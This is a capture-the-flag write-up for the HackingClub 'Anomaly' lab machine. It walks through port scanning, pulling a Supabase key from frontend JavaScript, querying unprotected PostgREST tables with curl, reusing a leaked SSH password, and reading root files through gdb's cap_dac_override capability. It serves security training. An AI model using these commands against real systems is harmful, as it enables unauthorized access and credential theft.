# Anomaly — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | Anomaly                                 |
| Difficulty | Easy                                  |
| OS         | Linux                                   |
| Category   | Web Exploitation / Privilege Escalation |

---

# Overview

This write-up documents my exploitation process for the **Anomaly** machine on the **HackingClub** lab platform.

The machine involved the following stages:

* Web enumeration
* JavaScript source code analysis
* Supabase / PostgREST RLS (Row Level Security) bypass
* Information Disclosure (Hardcoded credentials in logs)
* SSH access
* Linux privilege escalation via **Capabilities (`cap_dac_override`)**
* Root access using an exploited **GDB** binary

---

# Reconnaissance

The first step was performing a full port scan using **Nmap**.

\`\`\`bash
nmap -p- -Pn --open --min-rate 1200 172.16.5.119
\`\`\`

The scan revealed two open ports:

\`\`\`text
22/tcp
8000/tcp
\`\`\`

Next, I performed a more detailed scan.

\`\`\`bash
nmap -p 22,8000 -sVC 172.16.5.119 -vvv
\`\`\`

Result:

\`\`\`text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
8000/tcp open  http    Node.js (Express)
\`\`\`

Service summary:

* **SSH** → OpenSSH 8.9p1
* **Web server** → React / Supabase Application
* **Application title** → RHTech

---

# Web Enumeration

Opening the web application in the browser:

\`\`\`text
http://anomaly.hc:8000
\`\`\`

The page displayed a **login form** for an HR and Talent Management dashboard called RHTech.

The interface suggested restricted access for employees only.

---

# JavaScript Analysis

I inspected the application's source code using **browser DevTools (F12)**.

By analyzing the main minified JavaScript bundle, I discovered how the application connects to its backend.

One section of the code revealed hardcoded **Supabase** credentials:

\`\`\`javascript
var li = si(
  "http://anomaly.hc:8000", 
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6InN1cGFiYXNlIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjQ4NTMwMDAwMDB9.Y3Oru2v6UvB8HP9Xo_Ft1Wj9GYHFNOfEh9E78keoghA",
  {auth:{persistSession:!0,autoRefreshToken:!0}}
);
\`\`\`

This confirmed the application was communicating with a Supabase backend using an `anon` JWT key.

The code also revealed several database tables being queried directly from the frontend:

* `positions`
* `candidates`
* `settings`
* `access_logs`

---

# Exploitation — PostgREST RLS Bypass

The application uses Supabase, which exposes a REST API via PostgREST.

During analysis, it became clear that the database tables were missing **Row Level Security (RLS)** protections. 

To exploit this vulnerability, I used `curl` to query the `access_logs` table directly, authenticating with the leaked `anon` key.

\`\`\`bash
curl -X GET 'http://anomaly.hc:8000/rest/v1/access_logs?select=*' \
-H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6InN1cGFiYXNlIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjQ4NTMwMDAwMDB9.Y3Oru2v6UvB8HP9Xo_Ft1Wj9GYHFNOfEh9E78keoghA" \
-H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6InN1cGFiYXNlIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjQ4NTMwMDAwMDB9.Y3Oru2v6UvB8HP9Xo_Ft1Wj9GYHFNOfEh9E78keoghA"
\`\`\`

The database returned the contents of the `access_logs` table.

One specific log entry contained a scheduled cron job executing an SSH backup command with a **plaintext password**:

\`\`\`json
{
  "id":"fe103b5d-bb0c-455d-848d-a51665331ecd",
  "user_email":"it@rhtech.com",
  "action":"SSH_BACKUP",
  "source_ip":"172.16.4.115",
  "details":{
    "cmd": "sshpass -p 'Bkp@Server#2024' ssh rhbackup@172.16.4.115 -p 22 ./backup.sh",
    "note": "automated via cron",
    "status": "ok"
  }
}
\`\`\`

This confirmed a severe **Information Disclosure** vulnerability, yielding valid SSH credentials.

---

# SSH Access

After obtaining the credentials, the next step was getting shell access.

\`\`\`bash
ssh rhbackup@172.16.5.119
# Password: Bkp@Server#2024
\`\`\`

This confirmed access as:

\`\`\`text
rhbackup
\`\`\`

---

# User Flag

After gaining shell access, I searched for the user flag.

The flag was located in the user's home directory.

\`\`\`bash
cd ~
ls -la
\`\`\`

Example file:

\`\`\`text
user.txt
\`\`\`

Retrieve the flag:

\`\`\`bash
cat user.txt
\`\`\`

---

# Privilege Escalation

Next, I enumerated the system for Privilege Escalation vectors. 

Running `sudo -l` failed since `rhbackup` was not in the sudoers file. SUID binaries also did not yield any exploitable results.

I searched for **Linux Capabilities** assigned to binaries:

\`\`\`bash
/sbin/getcap -r / 2>/dev/null
\`\`\`

One highly interesting result appeared:

\`\`\`text
/usr/bin/gdb cap_dac_override=ep
\`\`\`

The `cap_dac_override` capability allows a binary to bypass all Discretionary Access Control (DAC) permission checks, meaning it can read, write, or execute any file on the system, regardless of ownership.

---

# Exploiting GDB Capabilities

Using **GDB (GNU Debugger)**, I leveraged its built-in Python execution feature to read files as root.

First, I verified the contents of the `/root` directory:

\`\`\`bash
gdb -nx -ex 'python import os; print(os.listdir("/root"))' -ex quit
\`\`\`

This command bypassed file permissions and confirmed the location of the root flag.

---

# Root Access & Flag

Since I could read any file on the system, I directly retrieved the root flag without needing to drop into an interactive root shell.

Retrieve it:

\`\`\`bash
gdb -nx -ex 'python print(open("/root/root.txt").read())' -ex quit
\`\`\`

---

# Skills Practiced

* Web application analysis
* JavaScript reverse engineering
* Supabase / PostgREST enumeration
* Identifying missing Row Level Security (RLS)
* Log analysis & Information Disclosure
* Linux privilege escalation
* Exploiting Linux Capabilities (`cap_dac_override`)
* Abusing GDB Python execution

---

# Final Result

Machine successfully compromised.

\`\`\`text
User: root
System: Linux
Platform: HackingClub
Machine: Anomaly
Difficulty: Easy
\`\`\`